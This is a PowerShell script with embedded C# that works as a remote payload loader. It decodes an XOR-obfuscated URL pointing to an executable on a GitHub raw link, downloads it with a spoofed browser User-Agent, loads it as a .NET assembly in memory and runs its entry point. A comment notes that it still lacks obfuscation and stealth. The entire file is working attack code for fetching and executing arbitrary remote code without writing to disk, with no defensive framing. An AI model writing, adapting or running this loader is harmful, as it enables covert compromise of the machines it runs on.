Add-Type -TypeDefinition @"
//Works with the ps1 file out of the box but lacks obfuscation and stealth shit
using System;
using System.Net;
using System.Reflection;

public class Download {
    public static byte[] GetBytes(string url) {
        WebClient wc = new WebClient();
        wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        return wc.DownloadData(url);
    }
}

public class Decrypt {
    public static string DecryptUrl(string base64Input, string key) {
        byte[] bytes = Convert.FromBase64String(base64Input);
        char[] output = new char[bytes.Length];
        for (int i = 0; i < bytes.Length; i++)
            output[i] = (char)(bytes[i] ^ key[i % key.Length]);
        return new string(output);
    }
}


public class Program {

    public static void Main() {
        string decryptionKey = "29ifIx0T";

        // https://raw.githubusercontent.com/that-dog-eater/test/main/testpayload2.exe
        string payloadUrlencoded = "Wk0dFjpCH3tAWB5ILhFEPEdbHBUsClM7XE0MCD1WUztfFh0OKAwdMF1eRAMoDFUmHU0MFT1XXTVbV0YSLAtEJFNABQkoHAJ6V0EM";

        string payloadUrl = Decrypt.DecryptUrl(payloadUrlencoded, decryptionKey);

        Console.WriteLine("Payload Url: " + payloadUrl);

        Console.WriteLine("Grabbing Payload...");
        byte[] payloadBytes = Download.GetBytes(payloadUrl);
        Console.WriteLine("Payload downloaded: " + payloadBytes.Length + " bytes");

        Assembly asm = Assembly.Load(payloadBytes);
        MethodInfo entryPoint = asm.EntryPoint;
        Console.WriteLine("Payload Ready to execute: " + payloadBytes.Length + " bytes");

        object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[0] };
        entryPoint.Invoke(null, parameters);
        Console.WriteLine("Payload executed!");
    }
}

"@


# run the payload
[Program]::Main()
